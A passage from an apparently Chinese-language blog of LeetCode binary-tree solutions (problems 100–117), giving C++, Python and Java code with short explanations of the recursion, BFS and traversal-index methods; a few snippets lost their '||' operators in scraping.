q-&gt;left) &amp;&amp; isSameTree(p-&gt;right, q-&gt;right); &#125;&#125;; Python 12345678910class Solution: # @param p, a tree node # @param q, a tree node # @return a boolean def isSameTree(self, p, q): if not p and not q: return True if p and q: return p.val==q.val and self.isSameTree(p.left,q.left) \\ and self.isSameTree(p.right,q.right) return False 101. Symmetric Tree Given a binary tree, check whether it is a mirror of itself (ie, symmetric around its center). For example, this binary tree is symmetric: 123456 1 &#x2F; \\ 2 2 &#x2F; \\ &#x2F; \\3 4 4 3 But the following is not: 123456 1 &#x2F; \\2 2 \\ \\ 3 3 Note: Bonus points if you could solve it both recursively and iteratively. 题目地址：leetcode Symmetric Tree 题目大意：给定一棵树，判断它是否关于root对称。 思路：继续递归吧。。。水 C++ 123456789101112class Solution &#123; bool dfs(TreeNode* t1, TreeNode* t2) &#123; if (!t1 &amp;&amp; !t2) return true; if (!t1 &amp;&amp; t2 || t1 &amp;&amp; !t2) return false; if (t1-&gt;val != t2-&gt;val) return false; return dfs(t1-&gt;left, t2-&gt;right) &amp;&amp; dfs(t1-&gt;right, t2-&gt;left); &#125;public: bool isSymmetric(TreeNode* root) &#123; return !root || dfs(root-&gt;left, root-&gt;right); &#125;&#125;; Python 123456789101112131415class Solution: # @param root, a tree node # @return a boolean def isSymmetric(self, root): if not root: return True return self.judge(root.left,root.right) def judge(self,L,R): if not L and not R: return True if L and R: return L.val==R.val and self.judge(L.left,R.right) \\ and self.judge(L.right,R.left) return False 还可以用BFS的方式做： 12345678910111213141516171819202122232425class Solution &#123;public: bool isSymmetric(TreeNode* root) &#123; if(!root) return true; vector&lt;TreeNode *&gt; cur_level&#123;root-&gt;left, root-&gt;right&#125;; while(!cur_level.empty())&#123; int n = cur_level.size(); for(int i = 0, j = n - 1; i &lt; j; ++i, --j)&#123; TreeNode *a = cur_level[i]; TreeNode *b = cur_level[j]; if(!a &amp;&amp; b a &amp;&amp; !b) return false; if(a &amp;&amp; b &amp;&amp; a-&gt;val != b-&gt;val) return false; &#125; vector&lt;TreeNode *&gt; next_level; for(int i = 0; i &lt; n; ++i)&#123; if(!cur_level[i]) continue; next_level.push_back(cur_level[i]-&gt;left); next_level.push_back(cur_level[i]-&gt;right); &#125; cur_level = next_level; &#125; return true; &#125;&#125;; 102. Binary Tree Level Order Traversal Given a binary tree, return the level order traversal of its nodes' values. (ie, from left to right, level by level). For example: Given binary tree &#123;3,9,20,#,#,15,7&#125;, 123456 3 &#x2F; \\9 20 &#x2F; \\ 15 7 return its level order traversal as: 12345[ [3], [9,20], [15,7]] 题目地址：leetcode Binary Tree Level Order Traversal 题目大意：给定一棵树，返回其层次遍历 思路： 方法一: 用队列进行层次遍历 C++ 12345678910111213141516171819202122class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) &#123; vector&lt;vector&lt;int&gt;&gt; ans; if(!root) return ans; queue&lt;TreeNode *&gt; q; q.push(root); while(!q.empty())&#123; vector&lt;int&gt; cur_level; int n = q.size(); while(n--)&#123; TreeNode *cur = q.front(); q.pop(); cur_level.push_back(cur-&gt;val); if(cur-&gt;left) q.push(cur-&gt;left); if(cur-&gt;right) q.push(cur-&gt;right); &#125; ans.push_back(cur_level); &#125; return ans; &#125;&#125;; Python 123456789101112131415161718class Solution(object): def levelOrder(self, root): &quot;&quot;&quot; :type root: TreeNode :rtype: List[List[int]] &quot;&quot;&quot; if not root: return [] q, ans = collections.deque([root]), [] while q: cur_level = [] n = len(q) for _ in range(n): cur = q.popleft() cur_level.append(cur.val) if cur.left: q.append(cur.left) if cur.right: q.append(cur.right) ans.append(cur_level) return ans 方法二 先序遍历 12345678910111213141516class Solution &#123; void dfs(int h, TreeNode *root, vector&lt;vector&lt;int&gt;&gt; &amp;ans)&#123; if(!root) return; if(h &gt;= ans.size()) ans.push_back(vector&lt;int&gt;&#123;&#125;); ans[h].push_back(root-&gt;val); dfs(h + 1, root-&gt;left, ans); dfs(h + 1, root-&gt;right, ans); &#125;public: vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) &#123; vector&lt;vector&lt;int&gt;&gt; ans; dfs(0, root, ans); return ans; &#125;&#125;; 103. Binary Tree Zigzag Level Order Traversal Given a binary tree, return the zigzag level order traversal of its nodes' values. (ie, from left to right, then right to left for the next level and alternate between). For example: Given binary tree &#123;3,9,20,#,#,15,7&#125;, 123456 3 &#x2F; \\9 20 &#x2F; \\ 15 7 return its zigzag level order traversal as: 12345[ [3], [20,9], [15,7]] 题目地址：leetcode Binary Tree Zigzag Level Order Traversal 题目大意：给定一棵树，返回其层次遍历（要求第一行从左到右，第二行从右到左） 思路：和上面一题差不多，加个判断奇偶即可。 C++ 123456789101112131415161718192021222324class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; zigzagLevelOrder(TreeNode* root) &#123; vector&lt;vector&lt;int&gt;&gt; ans; if(!root) return ans; queue&lt;TreeNode *&gt; q; q.push(root); for(int level = 0; !q.empty(); ++level)&#123; int t = q.size(); vector&lt;int&gt; cur_level; for(int i = 0; i &lt; t; ++i)&#123; TreeNode *cur = q.front(); q.pop(); cur_level.push_back(cur-&gt;val); if(cur-&gt;left) q.push(cur-&gt;left); if(cur-&gt;right) q.push(cur-&gt;right); &#125; if(level &amp; 1) reverse(cur_level.begin(), cur_level.end()); ans.push_back(cur_level); &#125; return ans; &#125;&#125;; Python 123456789101112131415161718192021class Solution(object): def zigzagLevelOrder(self, root): &quot;&quot;&quot; :type root: TreeNode :rtype: List[List[int]] &quot;&quot;&quot; if not root: return [] q = collections.deque([root]) ans = [] level = 0 while q: cur_level = [] cur_size = len(q) for i in range(cur_size): cur = q.popleft() if cur.left: q.append(cur.left) if cur.right: q.append(cur.right) cur_level.append(cur.val) ans.append(cur_level[::-1] if level &amp; 1 else cur_level) level += 1 return ans 当然还可以不逆序，直接输出到对应位置 12345678910111213141516171819202122class Solution(object): def zigzagLevelOrder(self, root): &quot;&quot;&quot; :type root: TreeNode :rtype: List[List[int]] &quot;&quot;&quot; if not root: return [] q = collections.deque([root]) ans = [] level = 0 while q: cur_size = len(q) cur_level = [0] * cur_size for i in range(cur_size): cur = q.popleft() if cur.left: q.append(cur.left) if cur.right: q.append(cur.right) index = (cur_size - i - 1) if level &amp; 1 else i cur_level[index] = cur.val ans.append(cur_level) level += 1 return ans 104. Maximum Depth of Binary Tree Given a binary tree, find its maximum depth. The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node. 题目地址：leetcode Maximum Depth of Binary Tree 题目大意：给定一棵树，返回其最大深度。 思路：思路，dfs. C++ 1234567891011121314151617class Solution &#123; void dfs(int cur, int &amp;max_depth, TreeNode *root)&#123; if(!root) return; if(++cur &gt; max_depth) max_depth = cur; dfs(cur, max_depth, root-&gt;left); dfs(cur, max_depth, root-&gt;right); &#125;public: int maxDepth(TreeNode* root) &#123; int ans = 0; dfs(0, ans, root); return ans; &#125;&#125;; 另一种更简洁写法 1234567class Solution &#123;public: int maxDepth(TreeNode* root) &#123; if (!root) return 0; return max(maxDepth(root-&gt;left), maxDepth(root-&gt;right)) + 1; &#125;&#125;; Python 1234class Solution: def maxDepth(self, root: TreeNode) -&gt; int: if not root: return 0 return max(self.maxDepth(root.left), self.maxDepth(root.right)) + 1 105 . Construct Binary Tree from Preorder and Inorder Traversal Given preorder and inorder traversal of a tree, construct the binary tree. Note: You may assume that duplicates do not exist in the tree. 题目地址：leetcode 105 Construct Binary Tree from Preorder and Inorder Traversal 题意：给定一棵树的前序和中序遍历，构建这棵树 思路：以下面的例子为例： 12345 3 &#x2F; \\9 20 &#x2F; \\ 15 7 前序遍历为： 3,9,20,15,7 中序遍历为： 9,3,15,20,7 前序遍历的第一个一定是根结点，而中序遍历的根结点把树准确的分为左子树和右子树。 所以，在中序遍历中查找3，发现下标为1，那么[0,1)为左子树，[2,5)为右子树。 递归的往下查找即可。 可以写出简洁的code 12345678910111213class Solution(object): def buildTree(self, preorder, inorder): &quot;&quot;&quot; :type preorder: List[int] :type inorder: List[int] :rtype: TreeNode &quot;&quot;&quot; if not preorder: return None root = TreeNode(preorder[0]) index = inorder.index(preorder[0]) root.left = self.buildTree(preorder[1: index + 1], inorder[:index]) root.right = self.buildTree(preorder[index + 1:], inorder[index + 1:]) return root 不过这样每次都需要切片，效率比较低。 我们可以设前序遍历开始为pb,结束pe，中序遍历开始为ib,结束为ie。前序遍历的第pb个元素（即当前根结点）在中序遍历中下标为index 则长度为len = index - ib 那么有， 左子树，每次递归的下标为：[pb + 1, pb + len + 1) [ ib, ib+len) 右子树：[pb + len + 1, pe) [ib + len + 1, ie) Python 12345678910111213141516class Solution(object): def _build(self, pb, pe, ib, ie, preorder, inorder): if pb &gt;= pe or ib &gt;= ie: return None root = TreeNode(preorder[pb]) len_left = inorder.index(preorder[pb]) - ib root.left = self._build(pb + 1, pb + len_left + 1, ib, ib + len_left, preorder, inorder) root.right = self._build(pb + len_left + 1, pe, ib + len_left + 1, ie, preorder, inorder) return root def buildTree(self, preorder, inorder): &quot;&quot;&quot; :type preorder: List[int] :type inorder: List[int] :rtype: TreeNode &quot;&quot;&quot; return self._build(0, len(preorder), 0, len(inorder), preorder, inorder) C++ 1234567891011121314class Solution &#123; TreeNode* build(int pb, int pe, int ib, int ie, const vector&lt;int&gt;&amp; preorder, const vector&lt;int&gt;&amp; inorder)&#123; if(pb &gt;= pe || ib &gt;= ie) return nullptr; TreeNode *root = new TreeNode(preorder[pb]); int len = find(inorder.begin() + ib, inorder.begin() + ie, preorder[pb]) - inorder.begin() - ib; root-&gt;left = build(pb + 1, pb + len + 1, ib, ib + len, preorder, inorder); root-&gt;right = build(pb + len + 1, pe, ib + len + 1, ie, preorder, inorder); return root; &#125;public: TreeNode* buildTree(vector&lt;int&gt;&amp; preorder, vector&lt;int&gt;&amp; inorder)&#123; return build(0, preorder.size(), 0, inorder.size(), preorder, inorder); &#125;&#125;; 106. Construct Binary Tree from Inorder and Postorder Traversal Given inorder and postorder traversal of a tree, construct the binary tree. Note: You may assume that duplicates do not exist in the tree. 题目地址：leetcode 106 Construct Binary Tree from Inorder and Postorder Traversal 题意：给定一棵树的中序和后序遍历，构建这棵树。 思路： 思路：以下面的例子为例： 12345 3 &#x2F; \\9 20 &#x2F; \\ 15 7 后序遍历为： 9,15,7,20,3 中序遍历为： 9,3,15,20,7 后序遍历的最后一个一定是根结点，而中序遍历的根结点把树准确的分为左子树和右子树。 和105题差不多，简单的写有： 123456789class Solution: def buildTree(self, inorder: List[int], postorder: List[int]) -&gt; TreeNode: if not inorder or not postorder: return None root = TreeNode(postorder[-1]) index = inorder.index(postorder[-1]) root.left = self.buildTree(inorder[:index], postorder[:index]) root.right = self.buildTree(inorder[index + 1:], postorder[index:len(postorder) -1]) return root 我们可以设后序遍历开始为pb,结束pe，中序遍历开始为ib,结束为ie。前序遍历的第pb个元素（即当前根结点）在中序遍历中下标为index 则长度为len = index - ib 那么有， 左子树，每次递归的下标为：[pb, pb + len) [ ib, ib+len) 右子树：[pb + len, pe - 1) [ib + len + 1, ie) 可以看出中序遍历的下标和上面一题是一样的 Python 这里用hash表存下了下标，这样每次不用find或者index查找了，比较快 1234567891011121314class Solution: def buildTree(self, inorder: List[int], postorder: List[int]) -&gt; TreeNode: index_dict = &#123;val : i for i, val in enumerate(inorder)&#125; return self.create(inorder, postorder, index_dict, 0, len(inorder), 0, len(postorder)) def create(self, inorder: List[int], postorder: List[int], index_dict: dict, ib: int, ie: int, pb: int, pe: int) -&gt; TreeNode: if ib &gt;= ie or pb &gt;= pe: return None root = TreeNode(postorder[pe - 1]) index = index_dict[root.val] left_len = index - ib root.left = self.create(inorder, postorder, index_dict, ib, ib + left_len, pb, pb + left_len) root.right = self.create(inorder, postorder, index_dict, ib + left_len + 1, ie, pb + left_len, pe - 1) return root C++ 1234567891011121314class Solution &#123; TreeNode* build(int is, int ie, int ps, int pe, const vector&lt;int&gt;&amp; inorder, const vector&lt;int&gt;&amp; postorder) &#123; if(is &gt;= ie ps &gt;= pe) return nullptr; TreeNode *root = new TreeNode(postorder[pe - 1]); int len = find(inorder.begin() + is, inorder.begin() + ie, postorder[pe - 1]) - inorder.begin() - is; root-&gt;left = build(is, is + len, ps, ps + len, inorder, postorder); root-&gt;right = build(is + len + 1, ie, ps + len, pe - 1, inorder, postorder); return root; &#125;public: TreeNode* buildTree(vector&lt;int&gt;&amp; inorder, vector&lt;int&gt;&amp; postorder) &#123; return build(0, inorder.size(), 0, postorder.size(), inorder, postorder); &#125;&#125;; 107. Binary Tree Level Order Traversal II Given a binary tree, return the bottom-up level order traversal of its nodes' values. (ie, from left to right, level by level from leaf to root). For example: Given binary tree &#123;3,9,20,#,#,15,7&#125;, 123456 3 &#x2F; \\9 20 &#x2F; \\ 15 7 return its bottom-up level order traversal as: 12345[ [15,7], [9,20], [3]] 题目地址：leetcode Binary Tree Level Order Traversal II 题目大意：给定一棵树，返回其层次遍历的逆序。 思路：和102题其实一样，最后结果逆序即可。太水了 C++ 1234567891011121314151617181920212223class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; levelOrderBottom(TreeNode* root) &#123; vector&lt;vector&lt;int&gt;&gt; ans; if(!root) return ans; queue&lt;TreeNode *&gt; q; q.push(root); while(!q.empty())&#123; int pre_size = q.size(); vector&lt;int&gt; cur_level; for(int i = 0; i &lt; pre_size; ++i)&#123; TreeNode *cur = q.front(); q.pop(); cur_level.push_back(cur-&gt;val); if(cur-&gt;left) q.push(cur-&gt;left); if(cur-&gt;right) q.push(cur-&gt;right); &#125; ans.push_back(cur_level); &#125; reverse(ans.begin(), ans.end()); return ans; &#125;&#125;; Python 1234567891011121314151617181920class Solution(object): def levelOrderBottom(self, root): &quot;&quot;&quot; :type root: TreeNode :rtype: List[List[int]] &quot;&quot;&quot; if not root: return [] q, ans = collections.deque([root]), [] while q: cur_level = [] n = len(q) for _ in range(n): cur = q.popleft() cur_level.append(cur.val) if cur.left: q.append(cur.left) if cur.right: q.append(cur.right) ans.append(cur_level) return ans[::-1] 还可以DFS做 12345678910111213141516171819class Solution &#123; void dfs(int level, TreeNode* root, vector&lt;vector&lt;int&gt;&gt; &amp;ans)&#123; if(!root) return; if(level &gt;= ans.size()) ans.push_back(vector&lt;int&gt;&#123;&#125;); ans[level].push_back(root-&gt;val); dfs(level + 1, root-&gt;left, ans); dfs(level + 1, root-&gt;right, ans); &#125; public: vector&lt;vector&lt;int&gt;&gt; levelOrderBottom(TreeNode* root) &#123; vector&lt;vector&lt;int&gt;&gt; ans; dfs(0, root, ans); reverse(ans.begin(), ans.end()); return ans; &#125;&#125;; 108. Convert Sorted Array to Binary Search Tree Given an array where elements are sorted in ascending order, convert it to a height balanced BST. 题目地址：leetcode 108 Convert Sorted Array to Binary Search Tree 题意：给定一个排好序的数组，要求建造BST树（高度要平衡） 思路：每次二分，递归建立左右子树 C++ 12345678910111213141516class Solution &#123;private: TreeNode* BuildTree(int L, int R, const vector&lt;int&gt;&amp; nums) &#123; if (L &gt; R) return nullptr; int mid = L + ((R - L) &gt;&gt; 1); TreeNode *root = new TreeNode(nums[mid]); root-&gt;left = BuildTree(L, mid - 1, nums); root-&gt;right = BuildTree(mid + 1, R, nums); return root; &#125;public: TreeNode* sortedArrayToBST(vector&lt;int&gt;&amp; nums) &#123; return BuildTree(0, nums.size() - 1, nums); &#125;&#125;; Java 12345678910111213141516class Solution &#123; private TreeNode BuildTree(int L, int R, final int[] nums) &#123; if (L &gt; R) return null; int mid = L + ((R - L) &gt;&gt; 1); TreeNode root = new TreeNode(nums[mid]); root.left = BuildTree(L, mid - 1, nums); root.right = BuildTree(mid + 1, R, nums); return root; &#125; public TreeNode sortedArrayToBST(int[] nums) &#123; return BuildTree(0, nums.length - 1, nums); &#125;&#125; Python 12345678910111213141516class Solution(object): def sortedArrayToBST(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: TreeNode &quot;&quot;&quot; def build_tree(L, R): if L &gt; R: return None mid = (L + R) &gt;&gt; 1 root = TreeNode(nums[mid]) root.left = build_tree(L, mid - 1) root.right = build_tree(mid + 1, R) return root return build_tree(0, len(nums) - 1) 109 Convert Sorted List to Binary Search Tree Given a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST. 题目地址：leetcode 109 Convert Sorted List to Binary Search Tree 题意：给定一个排好序的链表，要求建造BST树（高度要平衡） 思路： 方法一 每次将链表分为左右两部分即可。 使用快慢指针 复杂度O(nlogn) C++ 123456789101112131415161718class Solution &#123; TreeNode* createTree(ListNode* head, ListNode* end) &#123; if (head == end) return nullptr; ListNode *fast = head, *slow = head; while (fast != end &amp;&amp; fast-&gt;next != end) &#123; slow = slow-&gt;next; fast = fast-&gt;next-&gt;next; &#125; TreeNode *root = new TreeNode(slow-&gt;val); root-&gt;left = createTree(head, slow); root-&gt;right = createTree(slow-&gt;next, end); return root; &#125;public: TreeNode* sortedListToBST(ListNode* head) &#123; return createTree(head, nullptr); &#125;&#125;; Java 123456789101112131415161718class Solution &#123; private TreeNode buildTree(ListNode head, ListNode end) &#123; if (head == end) return null; ListNode slow = head, fast = head; while (fast != end &amp;&amp; fast.next != end) &#123; slow = slow.next; fast = fast.next.next; &#125; TreeNode root = new TreeNode(slow.val); root.left = buildTree(head, slow); root.right = buildTree(slow.next, end); return root; &#125; public TreeNode sortedListToBST(ListNode head) &#123; return buildTree(head,null); &#125;&#125; Python 123456789101112131415161718class Solution(object): def sortedListToBST(self, head): &quot;&quot;&quot; :type head: ListNode :rtype: TreeNode &quot;&quot;&quot; def build_tree(head, end): if head == end: return None fast = slow = head while fast != end and fast.next != end: slow, fast = slow.next, fast.next.next root = TreeNode(slow.val) root.left = build_tree(head, slow) root.right = build_tree(slow.next, end) return root return build_tree(head, None) 之前的python，计数的，不如快慢指针优雅。 1234567891011121314151617class Solution: # @param head, a list node # @return a tree node def sortedListToBST(self, head): if not head: return None tail ,length =head ,0 while tail: tail,length=tail.next,length+1 return self.dfs(head,0,length-1) def dfs(self,head,L,R): if L == R : return TreeNode(head.val) if L &gt; R : return None mid ,cnt ,tmp= (L+R)&gt;&gt;1,L,head while cnt &lt; mid: cnt , tmp = cnt + 1,tmp.next root = TreeNode(tmp.val) root.left,root.right=self.dfs(head,L,mid-1),self.dfs(tmp.next,mid+1,R) return root 方法二 BST利用中序遍历为有序的性质，来建树。 相当于链表保存的为中序遍历 要让建出来的树尽可能的平衡，那么用二分，mid = (L + R)/2，左边的就是[L,mid-1]，右边[mid+1,R] 中序遍历先遍历左子树，保存全局的链表head指针，每次向后移动即可。 C++ 1234567891011121314151617181920212223class Solution &#123;private: ListNode *head; TreeNode* inorderBuildTree(int L, int R) &#123; if (L &gt; R) return nullptr; int mid = L + ((R - L) &gt;&gt; 1); TreeNode *left = inorderBuildTree(L, mid - 1); TreeNode *root = new TreeNode(head-&gt;val); head = head-&gt;next; root-&gt;left = left; root-&gt;right = inorderBuildTree(mid + 1,R); return root; &#125;public: TreeNode* sortedListToBST(ListNode* head) &#123; int n = 0; this-&gt;head = head; for (; head; head = head-&gt;next) n++; return inorderBuildTree(0, n - 1); &#125;&#125;; Java 123456789101112131415161718192021class Solution &#123; private ListNode head = null; private TreeNode inorderBuildTree(int L, int R) &#123; if (L &gt; R) return null; int mid = L + ((R - L) &gt;&gt; 1); TreeNode left = inorderBuildTree(L, mid - 1); TreeNode root = new TreeNode(head.val); head = head.next; root.left = left; root.right = inorderBuildTree(mid + 1, R); return root; &#125; public TreeNode sortedListToBST(ListNode head) &#123; int n = 0; this.head = head; for (; head != null; head = head.next) n++; return inorderBuildTree(0, n - 1); &#125;&#125; Python 1234567891011121314151617181920212223class Solution(object): def sortedListToBST(self, head): &quot;&quot;&quot; :type head: ListNode :rtype: TreeNode &quot;&quot;&quot; def inorder_build_tree(L, R): if L &gt; R: return None mid = (L + R) &gt;&gt; 1 left = inorder_build_tree(L, mid - 1) root = TreeNode(self.head.val) self.head = self.head.next root.left = left root.right = inorder_build_tree(mid + 1, R) return root p = self.head = head n = 0 while p: n += 1 p = p.next return inorder_build_tree(0, n - 1) 110. Balanced Binary Tree Given a binary tree, determine if it is height-balanced. For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of every node never differ by more than 1. 题目地址：leetcode Balanced Binary Tree 题目大意：给定一棵树，判断其是否是平衡树（要求左右子树高度差不能超过1） 思路：用DFS来计算高度，若高度差超过1，则返回-1.否则，返回高度。 C++ 1234567891011121314151617181920class Solution &#123; int dfs(TreeNode* root)&#123; if(!root) return 0; int left = dfs(root-&gt;left); if(left == -1) return -1; int right = dfs(root-&gt;right); if(right == -1) return -1; if(abs(left - right) &gt; 1) return -1; return max(left, right) + 1; &#125; public: bool isBalanced(TreeNode* root) &#123; return dfs(root) != -1; &#125;&#125;; Python 1234567891011121314class Solution(object): def isBalanced(self, root): &quot;&quot;&quot; :type root: TreeNode :rtype: bool &quot;&quot;&quot; return self.dfs(root) != -1 def dfs(self, root): if not root: return 0 left, right = self.dfs(root.left), self.dfs(root.right) if left &lt; 0 or right &lt; 0 or abs(left - right) &gt;1 : return -1 return max(left, right) + 1 111. Minimum Depth of Binary Tree Given a binary tree, find its minimum depth. The minimum depth is the number of nodes along the shortest path from the root node down to the nearest leaf node. 题目地址：leetcode Minimum Depth of Binary Tree 题目大意：给定二叉树，求其最小的高度。（从根结点到叶结点的距离） 思路：DFS。注意叶结点的判断。 C++ 1234567891011121314class Solution &#123;public: int minDepth(TreeNode* root) &#123; if(!root) return 0; if(root-&gt;left &amp;&amp; root-&gt;right) return min(minDepth(root-&gt;left), minDepth(root-&gt;right)) + 1; else if(root-&gt;left) return minDepth(root-&gt;left) + 1; else if(root-&gt;right) return minDepth(root-&gt;right) + 1; else return 1; &#125;&#125;; Python 1234567891011121314class Solution: # @param root, a tree node # @return an integer def minDepth(self, root): if not root : return 0 return self.dfs(root,0) def dfs(self,root,depth): if not root : return depth if not root.left and root.right: return self.dfs(root.right,depth+1) if root.left and not root.right: return self.dfs(root.left,depth+1) if not root.left and not root.right: return depth + 1 L , R = self.dfs(root.left,depth+1),self.dfs(root.right,depth+1) return min(L,R) 112. Path Sum Given a binary tree and a sum, determine if the tree has a root-to-leaf path such that adding up all the values along the path equals the given sum. For example: Given the below binary tree and sum = 22, 12345678 5 &#x2F; \\ 4 8 &#x2F; &#x2F; \\ 11 13 4 &#x2F; \\ \\7 2 1 return true, as there exist a root-to-leaf path 5-&gt;4-&gt;11-&gt;2 which sum is 22. 题目地址：leetcode Path Sum 题目大意：给定一棵树，判断是否有从根结点到叶结点和为sum的情况。 思路：继续深搜。。 C++ 12345678910class Solution &#123;public: bool hasPathSum(TreeNode* root, int sum) &#123; if(!root) return false; sum -= root-&gt;val; if(!root-&gt;left &amp;&amp; !root-&gt;right) return sum == 0; return hasPathSum(root-&gt;left, sum ) hasPathSum(root-&gt;right, sum); &#125;&#125;; Python 123456789101112class Solution(object): def hasPathSum(self, root, target): &quot;&quot;&quot; :type root: TreeNode :type target: int :rtype: bool &quot;&quot;&quot; if not root: return False target -= root.val if not root.left and not root.right: return target == 0 return self.hasPathSum(root.left, target) or self.hasPathSum(root.right, target) 113. Path Sum II Given a binary tree and a sum, find all root-to-leaf paths where each path's sum equals the given sum. For example: Given the below binary tree and sum = 22, 12345678 5 &#x2F; \\ 4 8 &#x2F; &#x2F; \\ 11 13 4 &#x2F; \\ &#x2F; \\7 2 5 1 return 1234[ [5,4,11,2], [5,8,4,5]] 题目地址：leetcode Path Sum II 题目大意：给定二叉树，要求返回其和为sum的所有路径 思路：DFS。。。 C++ 1234567891011121314151617181920212223class Solution &#123; void dfs(vector&lt;int&gt; &amp;cur, TreeNode *root, int sum, vector&lt;vector&lt;int&gt;&gt; &amp;ans)&#123; if(!root) return; cur.push_back(root-&gt;val); sum -= root-&gt;val; if(!root-&gt;left &amp;&amp; !root-&gt;right &amp;&amp; sum == 0) ans.push_back(cur); dfs(cur, root-&gt;left, sum, ans); dfs(cur, root-&gt;right, sum, ans); cur.pop_back(); &#125; public: vector&lt;vector&lt;int&gt;&gt; pathSum(TreeNode* root, int sum) &#123; vector&lt;vector&lt;int&gt;&gt; ans; vector&lt;int&gt; cur; dfs(cur, root, sum, ans); return ans; &#125;&#125;; Python 12345678910111213141516171819class Solution: def dfs(self, cur, cur_sum, root, target, ans): if not root: return cur_sum += root.val cur.append(root.val) if cur_sum == target and not root.left and not root.right: ans.append(cur[:]) else: self.dfs(cur, cur_sum, root.left, target, ans) self.dfs(cur, cur_sum, root.right, target, ans) cur.pop() def pathSum(self, root: TreeNode, target: int) -&gt; List[List[int]]: ans = [] cur = [] self.dfs(cur, 0, root, target, ans) return ans 也可以这么写 12345678910111213141516171819202122232425class Solution: # @param root, a tree node # @param sum, an integer # @return a list of lists of integers def pathSum(self, root, sum): if not root:return [] ans ,path=[] ,[root.val] self.dfs(root.val,root,sum,path,ans) return ans def dfs(self,cur,root,sum,path,ans): if not root.left and not root.right: #leaf if cur == sum: ans.append(path[:]) return if root.left: path.append(root.left.val) self.dfs(cur+root.left.val,root.left,sum,path,ans) path.pop() if root.right: path.append(root.right.val) self.dfs(cur+root.right.val,root.right,sum,path,ans) path.pop() 114. Flatten Binary Tree to Linked List Given a binary tree, flatten it to a linked list in-place. For example, Given 123456 1 &#x2F; \\ 2 5 &#x2F; \\ \\3 4 6 The flattened tree should look like: 12345678910111 \\ 2 \\ 3 \\ 4 \\ 5 \\ 6 Hints: If you notice carefully in the flattened tree, each node's right child points to the next node of a pre-order traversal. 题目地址：leetcode Flatten Binary Tree to Linked List 题目大意：给定一棵二叉树，要求将其变为一条链（按照前序遍历的顺序） 思路：递归，设root左右子结点为L和R，把L和R分别变为链，L最后一个元素指向R即可。 C++ 12345678910111213141516class Solution &#123;public: void flatten(TreeNode* root) &#123; if(!root) return; flatten(root-&gt;left); flatten(root-&gt;right); TreeNode *left = root-&gt;left; if(left)&#123; while(left-&gt;right) left = left-&gt;right; left-&gt;right = root-&gt;right; root-&gt;right = root-&gt;left; root-&gt;left = nullptr; &#125; &#125;&#125;; Python 1234567891011121314151617class Solution(object): def flatten(self, root): &quot;&quot;&quot; :type root: TreeNode :rtype: void Do not return anything, modify root in-place instead. &quot;&quot;&quot; if not root: return self.flatten(root.left) self.flatten(root.right) left = root.left if not left: return while left.right: left = left.right left.right = root.right root.right = root.left root.left = None 116. 117 Populating Next Right Pointers in Each Node Given a binary tree 123456struct TreeLinkNode &#123; TreeLinkNode *left; TreeLinkNode *right; TreeLinkNode *next;&#125; Populate each next pointer to point to its next right node. If there is no next right node, the next pointer should be set to NULL. Initially, all next pointers are set to NULL. Note: You may only use constant extra space. You may assume that it is a perfect binary tree (ie, all leaves are at the same level, and every parent has two children). For example, Given the following perfect binary tree, 123456 1 &#x2F; \\ 2 3 &#x2F; \\ &#x2F; \\4 5 6 7 After calling your function, the tree should look like: 12345 1 -&gt; NULL &#x2F; \\ 2 -&gt; 3 -&gt; NULL &#x2F; \\ &#x2F; \\4-&gt;5-&gt;6-&gt;7 -&gt; NULL 题目地址： leetcode 116 Populating Next Right Pointers in Each Node leetcode 117 Populating Next Right Pointers in Each Node II 题意：给定一棵树，要求将其每一层的子结点连接起来。 思路：117比116的区别在于，116是满二叉树，117不一定。 一个思路是层次遍历，这样不管是不是满二叉树，都不会错，但是空间并不是O(1)的 123456789101112131415161718class Solution: # @param root, a tree node # @return nothing def connect(self, root): if not root:return pre,q=[],[] pre.append(root) while pre: n = len(pre) for i in range(n): if i == n - 1 : pre[i].next = None else : pre[i].next=pre[i+1] node=pre[i] if node.left: q.append(node.left) if node.right: q.append(node.right) pre = q[:] q=[] 有没有其他的方法呢? 我们先来看看116题，对于满二叉树，我们每次遍历一层的时候,将左儿子的next设置为右儿子，将右儿子设置为兄弟节点的左儿子。 C++ 1234567891011121314151617class Solution &#123;public: void connect(TreeLinkNode *root) &#123; if(!root) return; while(root-&gt;left)&#123; TreeLinkNode *cur = root, *p = nullptr; while(cur)&#123; cur-&gt;left-&gt;next = cur-&gt;right; p = cur-&gt;next; if(!p) break; cur-&gt;right-&gt;next = p-&gt;left; cur = p; &#125; root = root-&gt;left; &#125; &#125;&#125;; Python 123456789101112131415class Solution(object): def connect(self, root): &quot;&quot;&quot; :type root: TreeLinkNode :rtype: nothing &quot;&quot;&quot; while root: t = root while t: if t.left: t.left.next = t.right if t.right and t.next: t.right.next = t.next.left t = t.next root = root.left 那么117题并不是满二叉树，这就需要另外一个指针，指向每一层的最左边的节点，然后父节点不断的遍历其兄弟节点，而该节点对next赋值并不断的移动到刚赋值的next节点即可。 C++ 123456789101112131415161718192021222324class Solution &#123;public: void connect(TreeLinkNode *root) &#123; while(root)&#123; TreeLinkNode *cur = root, *first = nullptr, *p = first; while(cur)&#123; if(cur-&gt;left)&#123; if(!p) first = p = cur-&gt;left; else p = p-&gt;next = cur-&gt;left; &#125; if(cur-&gt;right)&#123; if(!p) first = p = cur-&gt;right; else p = p-&gt;next = cur-&gt;right; &#125; cur = cur-&gt;next; &#125; root = first; &#125; &#125;&#125;; Python 12345678910111213141516171819202122class Solution(object): def connect(self, root): &quot;&quot;&quot; :type root: TreeLinkNode :rtype: nothing &quot;&quot;&quot; while root: t, head = root, root.left if root.left else root.right while not head: t = root = root.next if not root: return head = root.left if root.left else root.right while t: if t.left and head != t.left: head.next = head = t.left #head.next = t.left #head = head.next if t.right and head != t.right: head.next = head = t.right t = t.next root = root.left if root.left else root.right 可用如下代码检验此题 1234567891011121314def printTreeByLeavesNext(root): print [root.val] while root: L = root.left if root.left else root.right while not L: root = root.next if not root: return L = root.left if root.left else root.right line = [] while L: line.append(L.val) L = L.next print line root = root.left 124. Binary Tree Maximum Path Sum Given a binary tree, 